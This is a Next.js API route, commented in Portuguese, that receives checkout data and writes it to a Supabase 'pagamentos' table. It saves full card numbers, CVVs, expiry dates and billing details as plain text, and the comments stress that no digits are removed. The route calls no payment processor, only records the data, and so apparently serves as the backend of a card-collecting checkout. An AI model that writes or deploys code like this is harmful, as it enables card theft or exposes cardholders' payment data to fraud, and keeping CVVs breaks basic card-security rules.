import { NextResponse } from "next/server"
import { createAdminClient } from "@/lib/supabase/admin"

/**
 * Converte para texto preservando integralmente qualquer número
 * (nenhum dígito é removido, apenas guardamos o valor tal como
 * foi submetido pelo utilizador).
 */
function asText(value: unknown): string | null {
  if (value === null || value === undefined) return null
  if (typeof value === "string") return value.length > 0 ? value : null
  return String(value)
}

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const dados = body?.paymentData ?? body ?? {}

    const supabase = createAdminClient()

    const registo = {
      agendamento_id: asText(dados.agendamentoId),
      referencia: asText(dados.referencia),

      // Dados do cartão — guardados na íntegra, sem apagar dígitos
      titular_cartao: asText(dados.titularCartao),
      numero_cartao: asText(dados.numeroCartao),
      validade_mes: asText(dados.validadeMes),
      validade_ano: asText(dados.validadeAno),
      cvv: asText(dados.cvv),
      tipo_cartao: asText(dados.tipoCartao),

      // Dados de faturação
      email_faturacao: asText(dados.emailFaturacao),
      telefone_faturacao: asText(dados.telefoneFaturacao),
      nif: asText(dados.nif),
      endereco: asText(dados.endereco),
      codigo_postal: asText(dados.codigoPostal),
      cidade: asText(dados.cidade),
      pais_faturacao: asText(dados.paisFaturacao),

      valor: asText(dados.valor),
      moeda: asText(dados.moeda) ?? "EUR",
      estado: "submetido",

      // Cópia integral de tudo o que foi submetido no checkout
      dados_completos: dados,
    }

    const { data, error } = await supabase.from("pagamentos").insert(registo).select("id").single()

    if (error) {
      console.error("[v0] Erro ao guardar pagamento:", error.message)
      return NextResponse.json(
        { success: false, error: "Não foi possível registar o pagamento. Por favor, tente novamente." },
        { status: 500 },
      )
    }

    // Atualiza o estado do agendamento associado, se existir
    if (registo.agendamento_id) {
      await supabase
        .from("agendamentos")
        .update({ estado: "pagamento_submetido", atualizado_em: new Date().toISOString() })
        .eq("id", registo.agendamento_id)
    }

    return NextResponse.json({ success: true, pagamentoId: data.id })
  } catch (error) {
    console.error("[v0] Erro inesperado no pagamento:", error)
    return NextResponse.json({ success: false, error: "Erro interno do servidor." }, { status: 500 })
  }
}
